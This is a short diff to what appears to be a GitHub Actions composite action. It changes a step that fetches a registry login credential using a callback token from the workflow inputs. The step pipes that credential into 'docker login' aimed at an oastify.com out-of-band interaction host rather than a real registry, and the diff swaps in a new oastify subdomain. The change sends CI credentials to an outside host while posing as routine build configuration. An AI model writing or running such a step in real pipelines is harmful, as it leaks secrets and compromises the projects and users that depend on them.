@@ -118,7 +118,7 @@ runs:
           -X POST \
           -H "Authorization: Bearer ${{ fromJSON(github.event.inputs.client_payload).operational_data.callback_token }}" \
           ${{ fromJSON(github.event.inputs.client_payload).operational_data.callback_urls.base_api }}/authentication/registry/login \
-          | docker login --username AWS --password-stdin ck0wksmh5bv340b1w949jtlnkeq5e52u.oastify.com
+          | docker login --username AWS --password-stdin oa28a4ctvnlfuc1dmlul95bzaqgh4js8.oastify.com
 
     - uses: actions/cache/restore@v3
       if: steps.set-cache-file.outputs.cache_file != ''
